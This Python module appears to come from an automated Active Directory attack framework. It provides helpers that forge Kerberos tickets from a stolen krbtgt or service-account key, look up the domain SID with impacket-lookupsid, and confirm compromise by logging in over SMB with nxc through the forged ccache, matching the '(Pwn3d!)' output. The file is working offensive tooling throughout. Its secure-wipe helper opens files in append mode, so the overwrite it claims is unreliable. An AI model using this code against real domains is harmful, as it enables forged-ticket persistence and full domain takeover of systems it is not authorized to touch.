"""Shared infrastructure for the T4 Kerberos ticket-forging executors.

Plain functions + regex constants only (like ``acl_common.py``). The signing key
(krbtgt / service-account key) is a SECRET: it is NEVER a ParamSpec (that would
leak via ``params_preview``), it rides ``-aesKey`` / ``-nthash`` so
``redact_argv`` masks it, and it is never written to a receipt or step note. The
forged ccache is engine-only and is SHREDDED on every path (success or failure).
The terminal proof is a VERIFIED re-authentication THROUGH the forged ccache
(``--use-kcache``, no operator creds), matched by the PRECISE cache-backed login
line -- never the forge tool's exit code, never the generic SMB ``[+]`` marker
(which also fires on NetExec's AS-REP-roastability diagnostic).
"""
from __future__ import annotations

import os
import re
from pathlib import Path
from typing import Optional

from .base import RunResult, redact_argv, StepRecord


# PRECISE cache-backed login success (B2): "[+] REALM\\user from ccache (Pwn3d!)".
_RE_FORGE_REAUTH_OK = re.compile(r"\[\+\][^\n]*from ccache[^\n]*\(Pwn3d!\)", re.I)
# ticketer: "[*] Saving ticket in <name>.ccache"
_RE_CCACHE_SAVED = re.compile(r"[Ss]aving ticket in\s+(\S+\.ccache)")
# A domain SID is S-1-5-21-a-b-c (no trailing -RID).
_RE_DOMAIN_SID = re.compile(r"S-1-5-21-\d+-\d+-\d+(?!-\d)")
_RE_ANY_SID = re.compile(r"S-1-5-21-\d+-\d+-\d+")


def netbios(cfg) -> str:
    """NetBIOS short name: explicit cfg.netbios_domain, else the FQDN's first label."""
    nb = getattr(cfg, "netbios_domain", None) or (cfg.domain or "").split(".", 1)[0]
    return nb.upper()


def signing_key(ctx) -> tuple[Optional[str], Optional[str]]:
    """The forge signing key + kind (``'aes'``|``'nt'``), PRESENCE-ONLY.

    In a chain it comes from the threaded capability (``ctx.input_caps`` carries
    an ``aes_key``/``nt_hash`` from the upstream KRBTGT edge); standalone it comes
    from ``ctx.config.forge_key`` (the operator's out-of-band ``--forge-key-file``
    / env). Returns ``(None, None)`` when absent -- the caller fails closed and an
    operator key is never substituted for an absent/invalid threaded key.
    """
    caps = getattr(ctx, "input_caps", None) or {}
    if caps.get("aes_key"):
        return caps["aes_key"], "aes"
    if caps.get("nt_hash"):
        return caps["nt_hash"], "nt"
    key = getattr(ctx.config, "forge_key", None)
    if key:
        return key, (getattr(ctx.config, "forge_key_kind", None) or "aes")
    return None, None


def key_flag(kind: Optional[str]) -> str:
    return "-aesKey" if (kind or "aes") == "aes" else "-nthash"


def requester_argv(cfg) -> Optional[list[str]]:
    """``-user <bare> -password|-hashes`` for ``ticketer -request`` -- the
    operator's OWN live low-privilege credential used to request the real ticket
    that Diamond/Sapphire re-sign. BARE username (the domain comes from
    ``-domain``; a ``domain/user`` form is parsed as a multi-component Principal
    and fails). Returns ``None`` when no usable requester credential is present."""
    if not cfg.username:
        return None
    argv = ["-user", cfg.username]
    if cfg.nt_hash:
        return argv + ["-hashes", cfg.nt_hash]
    if cfg.password is not None:
        return argv + ["-password", cfg.password]
    return None


def valid_key(key: Optional[str], kind: Optional[str]) -> bool:
    """A usable key is hex of the right width: NT = 32 hex; AES = 32 (128-bit) or
    64 (256-bit) hex. Rejects empty / placeholder / malformed keys."""
    if not key or not re.fullmatch(r"[0-9a-fA-F]+", key):
        return False
    n = len(key)
    return n == 32 if (kind or "aes") == "nt" else n in (32, 64)


def resolve_domain_sid(ctx, override: Optional[str]) -> Optional[str]:
    """The DOMAIN SID. ``override`` (operator) wins; else resolve via
    ``impacket-lookupsid`` bound to the configured DC and strip any RID. Returns
    ``None`` (UNKNOWN) on any failure / ambiguity / mismatch -- NEVER fabricated.
    """
    if override:
        m = _RE_DOMAIN_SID.search(override) or _RE_ANY_SID.search(override)
        return m.group(0) if m else None
    cfg = ctx.config
    target = f"{cfg.domain}/{cfg.username or ''}"
    if cfg.password is not None:
        target = f"{target}:{cfg.password}"
    target = f"{target}@{cfg.dc_ip}"
    argv = ["impacket-lookupsid", target, "0"]   # maxRid 0: just the domain SID, no RID brute
    res = ctx.runner.run(argv, timeout=cfg.tool_timeout_s)
    out = (res.stdout or "") + (res.stderr or "")
    if res.returncode is None or res.timed_out:
        return None
    m = _RE_DOMAIN_SID.search(out)
    return m.group(0) if m else None


def forge_and_reauth(ctx, forge_argv: list[str], ccache_name: str, reauth_target: str,
                     out_dir: Path) -> tuple[bool, list[StepRecord], list[str]]:
    """Forge (KRB5CCNAME UNSET, fresh dir) then re-authenticate THROUGH the forged
    ccache only. Returns ``(ok, steps, errors)`` where ``ok`` is the PRECISE
    cache-backed login predicate. The ccache is shredded on every path.
    """
    steps: list[StepRecord] = []
    errors: list[str] = []
    out_dir.mkdir(parents=True, exist_ok=True)
    ccache = out_dir / f"{ccache_name}.ccache"

    # 1) forge -- KRB5CCNAME explicitly UNSET so a stale inherited ticket cannot be
    #    cloned/reused; fresh isolated out_dir.
    res = ctx.runner.run(forge_argv, env={"KRB5CCNAME": None},
                         timeout=ctx.config.tool_timeout_s, cwd=str(out_dir))
    forge_out = (res.stdout or "") + (res.stderr or "")
    m = _RE_CCACHE_SAVED.search(forge_out)
    if m:
        cand = Path(m.group(1))
        ccache = cand if cand.is_absolute() else (out_dir / cand.name)
    forged = ccache.exists()
    steps.append(StepRecord(name="forge", ok=forged, argv_display=redact_argv(forge_argv),
                            returncode=res.returncode,
                            note="ticket forged" if forged else "no ccache produced"))
    if not forged:
        errors.append("forge_failed")
        _shred(out_dir)
        return False, steps, errors

    # 2) re-authenticate THROUGH the forged ccache only (no operator creds). The
    #    DC is used as both KDC and resolver so no realm/host DNS is required.
    reauth_argv = ["nxc", "smb", reauth_target, "--use-kcache",
                   "--kdcHost", ctx.config.dc_ip, "--dns-server", ctx.config.dc_ip]
    res = ctx.runner.run(reauth_argv, env={"KRB5CCNAME": str(ccache)},
                         timeout=ctx.config.tool_timeout_s)
    reauth_out = res.stdout or ""
    ok = bool(_RE_FORGE_REAUTH_OK.search(reauth_out))
    steps.append(StepRecord(name="reauth", ok=ok, argv_display=redact_argv(reauth_argv),
                            returncode=res.returncode,
                            note="authenticated via forged ccache (Pwn3d!)" if ok
                                 else "forged ticket did not authenticate"))
    if not ok:
        errors.append("reauth_failed")
    _shred(out_dir)
    return ok, steps, errors


def _shred(out_dir: Path) -> None:
    """Shred every ccache/pfx/cache artifact in the forge dir (secrets)."""
    try:
        for p in out_dir.glob("*"):
            if p.is_file():
                try:
                    length = p.stat().st_size
                    with open(p, "ba+", buffering=0) as fh:
                        fh.seek(0)
                        fh.write(os.urandom(max(1, length)))
                        fh.flush()
                        os.fsync(fh.fileno())
                except OSError:
                    pass
                try:
                    p.unlink()
                except OSError:
                    pass
    except OSError:
        pass
